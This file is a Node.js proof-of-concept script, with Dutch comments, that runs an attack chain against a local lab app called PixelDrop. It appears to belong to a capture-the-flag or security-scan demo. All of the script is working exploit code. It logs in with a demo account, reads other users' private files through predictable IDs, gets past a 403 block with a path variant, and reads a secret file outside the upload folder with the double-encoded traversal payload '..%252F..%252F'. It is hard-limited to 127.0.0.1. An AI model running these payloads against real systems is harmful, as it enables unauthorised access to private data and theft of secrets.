// threat_demo_pixeldrop.mjs - controlled, local-only proof for the PixelDrop scan.
// Usage: node threat_demo_pixeldrop.mjs <scan-id>
import fs from "node:fs";
import path from "node:path";

const scanId = process.argv[2];
if (!scanId) { console.error("usage: node threat_demo_pixeldrop.mjs <scan-id>"); process.exit(2); }
const HERE = import.meta.dirname;
const dir = path.join(HERE, "scans", scanId);
if (!fs.existsSync(dir)) { console.error(`unknown scan: ${scanId}`); process.exit(2); }
const BASE = "http://127.0.0.1:4102";
if (!/^http:\/\/127\.0\.0\.1:4102$/.test(BASE)) throw new Error("refusing non-lab target");

const t0 = Date.now();
const steps = [];
const flagSet = new Set();
const addFlags = (text) => { for (const m of String(text || "").matchAll(/HMW\{[^}]+\}/g)) flagSet.add(m[0]); };
const clip = (value, max = 1400) => {
  const s = String(value || "");
  return s.length > max ? `${s.slice(0, max)}\n... [${s.length - max} tekens ingekort]` : s;
};
const asJson = (text) => { try { return JSON.parse(text); } catch { return null; } };

async function call(url, options = {}) {
  const started = Date.now();
  const response = await fetch(url, { redirect: "manual", ...options });
  const text = await response.text();
  addFlags(text);
  return { status: response.status, ms: Date.now() - started, text, json: asJson(text), headers: response.headers };
}
function cookieOf(response) {
  const values = typeof response.headers.getSetCookie === "function"
    ? response.headers.getSetCookie()
    : [response.headers.get("set-cookie") || ""];
  return values.map((v) => v.split(";")[0]).filter(Boolean).join("; ");
}
function addStep(title, request, response, proof) {
  steps.push({
    n: steps.length + 1,
    atMs: Date.now() - t0,
    title,
    request,
    response: { status: response.status, ms: response.ms, body: clip(response.text) },
    proof,
  });
}

const login = await call(`${BASE}/login`, {
  method: "POST",
  headers: { "content-type": "application/x-www-form-urlencoded" },
  body: new URLSearchParams({ email: "demo@pixeldrop.test", password: "demo1234" }),
});
const cookie = cookieOf(login);
if (!cookie) throw new Error(`PixelDrop login failed: ${login.status}`);
addStep(
  "Inloggen met het demo-account dat op de loginpagina staat",
  { method: "POST", url: `${BASE}/login`, body: { email: "demo@pixeldrop.test", password: "demo1234" } },
  login,
  { role: "viewer", cookieIssued: true, status: login.status },
);

const own = await call(`${BASE}/api/files`, { headers: { cookie } });
const privateFiles = [];
for (const id of [1001, 1002, 1003]) {
  const response = await call(`${BASE}/api/files/${id}`, { headers: { cookie } });
  if (response.status === 200 && response.json) privateFiles.push(response.json);
}
const idor = await call(`${BASE}/api/files/1001`, { headers: { cookie } });
addStep(
  "Privébestanden van andere gebruikers lezen via een voorspelbaar id",
  { method: "GET", url: `${BASE}/api/files/1001`, headers: { cookie: "[DEMO_SESSION]" } },
  idor,
  {
    ownFiles: Array.isArray(own.json?.files) ? own.json.files.length : (Array.isArray(own.json) ? own.json.length : 0),
    privateFilesRead: privateFiles.map((file) => ({
      id: file.id,
      owner: file.owner?.email || file.owner,
      name: file.name,
      flag: (String(JSON.stringify(file)).match(/HMW\{[^}]+\}/) || [])[0] || "",
    })),
  },
);

const acl = await call(`${BASE}/download?file=./internal/acl-test.txt`);
addStep(
  "De 403-blokkade op de besloten map omzeilen met een padvariant",
  { method: "GET", url: `${BASE}/download?file=./internal/acl-test.txt` },
  acl,
  { restrictedFile: "internal/acl-test.txt", status: acl.status, content: clip(acl.text, 500) },
);

const traversal = await call(`${BASE}/download?file=..%252F..%252Fsecret%252Fflag.txt`);
addStep(
  "Met dubbele path-encoding een geheim bestand buiten de uploadmap lezen",
  { method: "GET", url: `${BASE}/download?file=..%252F..%252Fsecret%252Fflag.txt` },
  traversal,
  { flag: (traversal.text.match(/HMW\{[^}]+\}/) || [])[0] || "", path: "secret/flag.txt" },
);

const flags = [...flagSet].sort();
const impact = {
  durationMs: Date.now() - t0,
  invoicesRead: 0,
  customersExposed: 0,
  privateFilesRead: privateFiles.length,
  restrictedFilesRead: 1,
  secretsExposed: 0,
  secretFilesRead: traversal.text.includes("HMW{") ? 1 : 0,
  adminApps: 0,
  appsCompromised: 1,
  pivotedApps: 0,
  flags: flags.length,
  attackerAccounts: 1,
};
const chain = {
  scanId,
  generatedAt: new Date().toISOString(),
  targetScope: { pixeldrop: BASE, note: "Local synthetic lab only. No external target was contacted." },
  title: "Van demo-login naar alle privébestanden en het geheime bestand",
  actor: "Eén aanvaller met het publieke demo-account op de loginpagina",
  impact,
  steps,
  data: {
    invoices: [],
    privateFiles: privateFiles.map((file) => ({
      id: file.id, owner: file.owner?.email || file.owner, name: file.name,
    })),
    restrictedFile: { name: "internal/acl-test.txt", status: acl.status },
    secretFile: { path: "secret/flag.txt", flag: (traversal.text.match(/HMW\{[^}]+\}/) || [])[0] || "" },
    secretNames: [],
  },
  flags,
  conclusion: "De keten is met één script uitgevoerd. Dezelfde stappen werken opnieuw zolang de demo-login en de padnormalisatie open staan.",
};
fs.writeFileSync(path.join(dir, "attack-chain.json"), JSON.stringify(chain, null, 2));
console.log(JSON.stringify({ out: path.join(dir, "attack-chain.json"), impact, flags }, null, 2));
